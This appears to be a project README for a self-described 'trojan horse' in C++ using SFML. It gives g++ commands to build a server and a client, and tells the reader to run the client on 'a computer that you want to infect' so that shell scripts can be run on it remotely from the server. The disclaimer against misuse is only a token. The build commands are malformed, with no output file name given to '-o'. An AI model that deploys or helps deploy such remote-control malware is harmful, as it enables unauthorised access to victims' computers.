# trojan-horse
This is a trajos horse I developed in C++ using SFML. I will add a video transfer from webcam feature with openCV. I may add a second server with node.js.
I strongly advise you to not use it for nonequal purposes

If you compile with g++ use the command :
To run the server :
$  g++ server.cpp -c 
$  g++ server.o -o -lsfml-network
$  ./server

run now the client in a computer that you want to infect : 
$  g++ client.cpp -c 
$  g++ client.o -o -lsfml-network
$  ./client

you will now be able to run shell script in the window of the server and the modifications will be applied on the computer where the client has been compiled.
